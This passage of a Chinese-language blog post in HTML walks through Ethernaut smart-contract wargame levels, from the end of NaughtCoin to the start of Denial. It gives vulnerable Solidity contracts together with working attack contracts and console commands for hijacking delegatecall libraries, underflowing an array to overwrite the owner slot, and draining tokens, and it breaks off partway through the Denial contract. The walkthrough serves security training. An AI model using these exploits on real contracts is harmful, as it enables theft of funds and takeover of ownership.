INITIAL_SUPPLY);</span><br><span class="line">    emit Transfer(address(<span class="number">0</span>), player, INITIAL_SUPPLY);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">transfer</span>(<span class="params">address _to, uint256 _value</span>) <span class="title">lockTokens</span> <span class="title">public</span> <span class="title">returns</span>(<span class="params">bool</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.transfer(_to, _value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Prevent the initial owner from transferring tokens until the timelock has passed</span></span><br><span class="line">  modifier lockTokens() &#123;</span><br><span class="line">    <span class="keyword">if</span> (msg.sender == player) &#123;</span><br><span class="line">      <span class="built_in">require</span>(now &gt; timeLock);</span><br><span class="line">      _;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">     _;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="解题过程-4"><a href="#解题过程-4" class="headerlink" title="解题过程"></a>解题过程</h3><p>ERC20 标准中有 approve 和 transferFrom 函数，可以允许第三方动用代币持有人的资金，所以先写一个攻击合约：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">contract HackCoin &#123;</span><br><span class="line"></span><br><span class="line">    NaughtCoin c;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">constructor</span>(NaughtCoin _addr) public &#123;</span><br><span class="line">        c = _addr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">transfer</span>(<span class="params">address sender, address _to, uint256 _value</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        c.transferFrom(sender, _to, _value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后使用 <code>contract.approve(&#39;attacker contract address&#39;, (await contract.balanceOf(player)).toString())</code> 将玩家的所有代币委托给攻击合约。</p>
+<p>最后调用攻击合约 <code>transfer(player, target, value)</code> 即可。</p>
+<h2 id="16-Preservation"><a href="#16-Preservation" class="headerlink" title="16. Preservation"></a>16. Preservation</h2><h3 id="通关条件-5"><a href="#通关条件-5" class="headerlink" title="通关条件"></a>通关条件</h3><p>获得目标合约的 ownership</p>
+<h3 id="目标合约-5"><a href="#目标合约-5" class="headerlink" title="目标合约"></a>目标合约</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.5</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract Preservation &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// public library contracts</span></span><br><span class="line">  address public timeZone1Library;</span><br><span class="line">  address public timeZone2Library;</span><br><span class="line">  address public owner;</span><br><span class="line">  uint storedTime;</span><br><span class="line">  <span class="comment">// Sets the function signature for delegatecall</span></span><br><span class="line">  bytes4 constant setTimeSignature = bytes4(keccak256(<span class="string">"setTime(uint256)"</span>));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">constructor</span>(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public &#123;</span><br><span class="line">    timeZone1Library = _timeZone1LibraryAddress;</span><br><span class="line">    timeZone2Library = _timeZone2LibraryAddress;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// set the time for timezone 1</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">setFirstTime</span>(<span class="params">uint _timeStamp</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// set the time for timezone 2</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">setSecondTime</span>(<span class="params">uint _timeStamp</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Simple library contract to set the time</span></span><br><span class="line">contract LibraryContract &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// stores a timestamp</span></span><br><span class="line">  uint storedTime;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">setTime</span>(<span class="params">uint _time</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    storedTime = _time;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="解题过程-5"><a href="#解题过程-5" class="headerlink" title="解题过程"></a>解题过程</h3><p>回顾一下第 6 题：</p>
+<blockquote>
+<p>delegatecall 调用的是其他合约的代码，但是修改的是当前合约的存储空间</p>
+</blockquote>
+<p>考虑以下因素：</p>
+<ol>
+<li>Preservation 调用 setTime 的时候，修改的是 Preservation 的存储空间，而非 LibraryContract 的。</li>
+<li>setTime 执行的时候，会对 uint 类型的 storedTime 赋值，这实际意味着对存储空间中的 slot 0 进行赋值。</li>
+<li>Preservation 存储空间中 slot 0 存储的是 timeZone1Library，也就是调用 setTime 将会导致 timeZone1Library 被修改。</li>
+</ol>
+<p>综合以上 3 点，我们可以将 timeZone1Library 替换为攻击合约。攻击合约沿用上面的思路，构建一个新的 LibraryContract，该合约在调用 setTime 的时候，会修改存储空间中 slot 2 的值（Preservation 的 slot 2 存储的是 owner）。攻击合约如下：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">contract HackPreservation &#123;</span><br><span class="line"></span><br><span class="line">    address public tempAddress1;</span><br><span class="line">    address public tempAddress2;</span><br><span class="line">    uint storedTime;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setTime</span>(<span class="params">uint _time</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        storedTime = _time;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>部署攻击合约，得到 attackerContractAddress，执行以下操作：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">contract.setFirstTime(<span class="string">'attackerContractAddress'</span>);</span><br><span class="line">contract.setFirstTime(player);</span><br></pre></td></tr></table></figure>
+
+<p>至此攻击完成。</p>
+<h2 id="17-Recovery"><a href="#17-Recovery" class="headerlink" title="17. Recovery"></a>17. Recovery</h2><h3 id="通关条件-6"><a href="#通关条件-6" class="headerlink" title="通关条件"></a>通关条件</h3><p>找出目标合约生成的代币合约，并取出里面的 ETH</p>
+<h3 id="目标合约-6"><a href="#目标合约-6" class="headerlink" title="目标合约"></a>目标合约</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.5</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">'openzeppelin-solidity/contracts/math/SafeMath.sol'</span>;</span><br><span class="line"></span><br><span class="line">contract Recovery &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//generate tokens</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">generateToken</span>(<span class="params">string memory _name, uint256 _initialSupply</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    <span class="keyword">new</span> SimpleToken(_name, msg.sender, _initialSupply);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SimpleToken &#123;</span><br><span class="line"></span><br><span class="line">  using SafeMath <span class="keyword">for</span> uint256;</span><br><span class="line">  <span class="comment">// public variables</span></span><br><span class="line">  string public name;</span><br><span class="line">  mapping (<span class="function"><span class="params">address</span> =&gt;</span> uint) public balances;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// constructor</span></span><br><span class="line">  <span class="keyword">constructor</span>(string memory _name, address _creator, uint256 _initialSupply) public &#123;</span><br><span class="line">    name = _name;</span><br><span class="line">    balances[_creator] = _initialSupply;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// collect ether in return for tokens</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span>(<span class="params"></span>) <span class="title">external</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">    balances[msg.sender] = msg.value.mul(<span class="number">10</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// allow transfers of tokens</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">transfer</span>(<span class="params">address _to, uint _amount</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    <span class="built_in">require</span>(balances[msg.sender] &gt;= _amount);</span><br><span class="line">    balances[msg.sender] = balances[msg.sender].sub(_amount);</span><br><span class="line">    balances[_to] = _amount;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// clean up after ourselves</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">destroy</span>(<span class="params">address payable _to</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    selfdestruct(_to);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="解题过程-6"><a href="#解题过程-6" class="headerlink" title="解题过程"></a>解题过程</h3><p>直接去 Etherscan 找 instance 的交易记录，可以很容易找到代币合约，然后调用其 destroy 函数即可。操作如下：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> func = web3.eth.abi.encodeFunctionSignature(<span class="string">'destroy(address)'</span>)</span><br><span class="line"><span class="keyword">let</span> param = web3.eth.abi.encodeParameter(<span class="string">'address'</span>, player)</span><br><span class="line">data = func + param.replace(<span class="string">'0x'</span>, <span class="string">''</span>)</span><br><span class="line">web3.eth.sendTransaction(&#123;<span class="attr">from</span>: player, <span class="attr">to</span>: <span class="string">'token contract address'</span>, <span class="attr">data</span>: data&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>不过按照通关之后给的 tips 的意思，应该是想让玩家计算出代币合约地址。</p>
+<p>合约地址的计算方式为：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">address = keccak(RLP([creator, nonce]))[<span class="number">12</span>:] <span class="comment">// 取右边的 20 个 bytes</span></span><br></pre></td></tr></table></figure>
+
+<p>更多信息可以参考<a href="https://learnblockchain.cn/2019/06/10/address-compute" target="_blank" rel="noopener">这里</a>。</p>
+<h2 id="18-MagicNumber"><a href="#18-MagicNumber" class="headerlink" title="18. MagicNumber"></a>18. MagicNumber</h2><h3 id="通关条件-7"><a href="#通关条件-7" class="headerlink" title="通关条件"></a>通关条件</h3><p>部署一个只有 10 个 opcode 的合约，该合约在调用后返回 42</p>
+<h3 id="调用者合约"><a href="#调用者合约" class="headerlink" title="调用者合约"></a>调用者合约</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.5</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract MagicNum &#123;</span><br><span class="line"></span><br><span class="line">  address public solver;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">constructor</span>() public &#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">setSolver</span>(<span class="params">address _solver</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    solver = _solver;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    ____________/\\\_______/\\\\\\\\\_____</span></span><br><span class="line"><span class="comment">     __________/\\\\\_____/\\\///////\\\___</span></span><br><span class="line"><span class="comment">      ________/\\\/\\\____\///______\//\\\__</span></span><br><span class="line"><span class="comment">       ______/\\\/\/\\\______________/\\\/___</span></span><br><span class="line"><span class="comment">        ____/\\\/__\/\\\___________/\\\//_____</span></span><br><span class="line"><span class="comment">         __/\\\\\\\\\\\\\\\\_____/\\\//________</span></span><br><span class="line"><span class="comment">          _\///////////\\\//____/\\\/___________</span></span><br><span class="line"><span class="comment">           ___________\/\\\_____/\\\\\\\\\\\\\\\_</span></span><br><span class="line"><span class="comment">            ___________\///_____\///////////////__</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="解题过程-7"><a href="#解题过程-7" class="headerlink" title="解题过程"></a>解题过程</h3><p>不会，找到了<a href="https://medium.com/coinmonks/ethernaut-lvl-19-magicnumber-walkthrough-how-to-deploy-contracts-using-raw-assembly-opcodes-c50edb0f71a2" target="_blank" rel="noopener">这篇</a>题解。我们需要手工构造一个合约。</p>
+<p>创建合约的交易的 bytecode 主要由初始化代码和运行时代码两部分组成。初始化代码用于创建合约，并存储运行时代码；运行时代码则是合约的实际逻辑。</p>
+<p>首先考虑运行时代码。我们需要将 42（0x2A）存放到内存中，再返回给调用者。第一个步骤需要使用 MSTORE（0x52，用于将一个 (u)int256 写入内存，0x52），第二个步骤需要使用 RETURN（0xF3，返回合约调用的结果）。</p>
+<p>第一步需要执行：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PUSH1 <span class="number">0x2A</span>（PUSH1，<span class="number">0x60</span>，用于将 <span class="number">1</span> byte 的值推入插槽栈中。这里我们需要存储 <span class="number">42</span>）</span><br><span class="line">PUSH1 <span class="number">0x80</span>（我们将 <span class="number">0x2A</span> 存入 slot <span class="number">0x80</span>）</span><br><span class="line">MSTORE（以前两个元素作为参数调用 MSTORE）</span><br><span class="line"></span><br><span class="line">所以该步骤的代码为 <span class="number">0x602A608052</span></span><br></pre></td></tr></table></figure>
+
+<p>第二步需要执行：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PUSH1 <span class="number">0x20</span>（返回值的长度，我们设置为 <span class="number">32</span> bytes）</span><br><span class="line">PUSH1 <span class="number">0x80</span>（返回值存储在 slot <span class="number">0x80</span>）</span><br><span class="line">RETURN（以前两个元素为参数调用 RETURN）</span><br><span class="line"></span><br><span class="line">所以该步骤的代码为 <span class="number">0x60206080F3</span></span><br></pre></td></tr></table></figure>
+
+<p>两个步骤结合起来得到我们的运行时代码 <code>0x602A60805260206080F3</code>，刚好 10 个 opcode，同时也是 10 bytes。</p>
+<p>现在考虑初始化代码。初始化代码需要拷贝运行时代码并返回给 EVM。第一个步骤需要使用 CODECOPY（0x39，用于拷贝运行时代码），第二个步骤也是 RETURN。</p>
+<p>第一步需要执行：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PUSH1 <span class="number">0x0A</span>（运行时代码的大小，<span class="number">10</span> bytes）</span><br><span class="line">PUSH1 <span class="number">0</span>x??（运行时代码目前的位置，现在还是未知）</span><br><span class="line">PUSH1 <span class="number">0x00</span>（运行时代码存储的目标位置，我们设定为 slot <span class="number">0x00</span>）</span><br><span class="line">CODECOPY（以前三个元素为参数调用 CODECOPY）</span><br><span class="line"></span><br><span class="line">所以该步骤代码为 <span class="number">0x600A60</span>??<span class="number">600039</span></span><br></pre></td></tr></table></figure>
+
+<p>第二步需要执行：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PUSH1 <span class="number">0x0A</span>（运行时代码的长度，<span class="number">10</span> bytes）</span><br><span class="line">PUSH1 <span class="number">0x00</span>（运行时代码存储的位置，slot <span class="number">0x00</span>）</span><br><span class="line">RETURN（以前两个元素为参数调用 RETURN）</span><br><span class="line"></span><br><span class="line">所以该步骤代码为 <span class="number">0x600A6000F3</span></span><br></pre></td></tr></table></figure>
+
+<p>结合以上两步我们可以得到初始化代码一共 12 bytes，运行时代码会接在初始化代码之后，所以上面的 0x?? 实际上是 0x0C（运行时代码在 bytecode 中的起始索引为 12）。由此得到我们的初始化代码 <code>0x600A600C600039600A6000F3</code></p>
+<p>将初始化代码和运行时代码组合起来就得到了我们的 bytecode：<code>0x600A600C600039600A6000F3602A60805260206080F3</code>。</p>
+<p>接下来部署我们的合约并设置为 Solver：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> bytecode = <span class="string">"0x600A600C600039600A6000F3602A60805260206080F3"</span>;</span><br><span class="line">web3.eth.sendTransaction(&#123;<span class="attr">from</span>: player, <span class="attr">data</span>: bytecode&#125;);</span><br><span class="line"><span class="comment">// 通关 Etherscan 得到合约地址 contractAddress</span></span><br><span class="line"><span class="keyword">await</span> contract.setSolver(<span class="string">"contractAddress"</span>);</span><br></pre></td></tr></table></figure>
+
+<p>最后提交通关～</p>
+<p>补充：有关 EVM 和 opcode 相关的内容可以查看<a href="https://ethervm.io" target="_blank" rel="noopener">这里</a>。</p>
+<h2 id="19-Alien-Codex"><a href="#19-Alien-Codex" class="headerlink" title="19. Alien Codex"></a>19. Alien Codex</h2><p>这道题获取 instance 的时候有 BUG，需要手工做些处理。详情在<a href="https://github.com/OpenZeppelin/ethernaut/issues/157" target="_blank" rel="noopener">这儿</a>。</p>
+<h3 id="通关条件-8"><a href="#通关条件-8" class="headerlink" title="通关条件"></a>通关条件</h3><p>获得目标合约的 ownership</p>
+<h3 id="目标合约-7"><a href="#目标合约-7" class="headerlink" title="目标合约"></a>目标合约</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.5</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">'openzeppelin-solidity/contracts/ownership/Ownable.sol'</span>;</span><br><span class="line"></span><br><span class="line">contract AlienCodex is Ownable &#123;</span><br><span class="line"></span><br><span class="line">  bool public contact;</span><br><span class="line">  bytes32[] public codex;</span><br><span class="line"></span><br><span class="line">  modifier contacted() &#123;</span><br><span class="line">    assert(contact);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">make_contact</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    contact = <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">record</span>(<span class="params">bytes32 _content</span>) <span class="title">contacted</span> <span class="title">public</span> </span>&#123;</span><br><span class="line">  	codex.push(_content);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">retract</span>(<span class="params"></span>) <span class="title">contacted</span> <span class="title">public</span> </span>&#123;</span><br><span class="line">    codex.length--;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">revise</span>(<span class="params">uint i, bytes32 _content</span>) <span class="title">contacted</span> <span class="title">public</span> </span>&#123;</span><br><span class="line">    codex[i] = _content;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="解题过程-8"><a href="#解题过程-8" class="headerlink" title="解题过程"></a>解题过程</h3><p>该合约的 owner 字段定义在 Ownable 中，存储在 slot 0，我们的目标就是替换 slot 0 中的数据。<br>注意以下几点：</p>
+<ol>
+<li>目标合约定义了一个叫 codex 的 bytes32[] 类型的数组，我们可以向该数组中添加/修改数据，还可以修改数组的长度</li>
+<li>在 Solidity 中，插槽数组大小为 2**256，codex 中的元素为 bytes32 类型，所以一个元素会占据一个 slot</li>
+<li>在 Solidity 中，(2**256 - 1) + 1 = 0</li>
+<li>各个字段在 Storage 中的布局：</li>
+</ol>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">address _owner: slot <span class="number">0</span>, <span class="number">20</span> bytes</span><br><span class="line">bool contact: slot <span class="number">0</span>, <span class="number">8</span> bytes</span><br><span class="line">length <span class="keyword">of</span> codex: slot <span class="number">1</span>, <span class="number">32</span> bytes</span><br><span class="line">codex elements: start <span class="keyword">from</span> slot keccak256(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<p>综合这些信息不难想到，我们可以通过让 codex 溢出来访问到 slot 0。Storage 的情况可以使用 remix 的 Debug 功能来观察、验证。</p>
+<p>具体的攻击步骤如下：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">contract.make_contact()</span><br><span class="line">contract.retract() <span class="comment">// 该步骤使得 codex.length 溢出，codex.length == 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="comment">// codex 的第一个元素应该位于 keccak256(abi.encodePacked(1)) == 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6，该 slot 到 slot 0 的距离为:</span></span><br><span class="line"><span class="comment">// 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff - 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6 + 1</span></span><br><span class="line"><span class="comment">// 结果为 35707666377435648211887908874984608119992236509074197713628505308453184860938</span></span><br><span class="line">contract.revise(<span class="string">'35707666377435648211887908874984608119992236509074197713628505308453184860938'</span>, player) <span class="comment">// 注意 player 需要添加前置 0，因为 address 是 20 bytes，而 slot 0 存储 32 bytes</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="20-Denial"><a href="#20-Denial" class="headerlink" title="20. Denial"></a>20. Denial</h2><h3 id="通关条件-9"><a href="#通关条件-9" class="headerlink" title="通关条件"></a>通关条件</h3><p>阻止目标合约的 owner 从合约中转账</p>
+<h3 id="目标合约-8"><a href="#目标合约-8" class="headerlink" title="目标合约"></a>目标合约</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.5</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">'openzeppelin-solidity/contracts/math/SafeMath.sol'</span>;</span><br><span class="line"></span><br><span class="line">contract Denial &#123;</span><br><span class="line"></span><br><span class="line">    using SafeMath <span class="keyword">for</span> uint256;</span><br><span class="line">    address public partner; <span class="comment">// withdrawal partner - pay the gas, split the withdraw</span></span><br><span class="line">    address payable public constant owner = address(<span class="number">0xA9E</span>);</span><br><span class="line">    uint timeLastWithdrawn;</span><br><span class="line">    mapping(<span class="function"><span class="params">address</span> =&gt;</span> uint) withdrawPartnerBalances; <span class="comment">// keep track of partners balances</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setWithdrawPartner</span>(<span class="params">address _partner</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        partner = _partner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// withdraw 1% to recipient and 1% to owner</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">withdraw</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        uint amountToSend = address(<span class="keyword">this</span>).balance.div(<span class="number">100</span>);</span><br><span class="line">        <span class="comment">// perform a call without checking return</span></span><br><span class="line">        <span class="comment">// The recipient can revert, the owner will still get their share</span></span><br><span class="line">        partner.call.value(amountToSend)(<span class="string">""</span>);</span><br><span class="line">        owner.transfer(amountToSend);</span><br><span class="line">        <span class="comment">// keep track of last withdrawal time</span></span><br><span class="line">        timeLastWithdrawn = now;</span><br><span class="line">        withdrawPartnerBalances[partner] = withdrawPartnerBalances[partner].add(amountToSend);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// allow deposit of funds</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span>(<span class="params"></span>) <span class="title">external</span> <span class="title">payable</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// convenience function</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">contractBalance</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">uint</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> address(<span class="keyword">this</span>).balance;</span><br><span class="line">    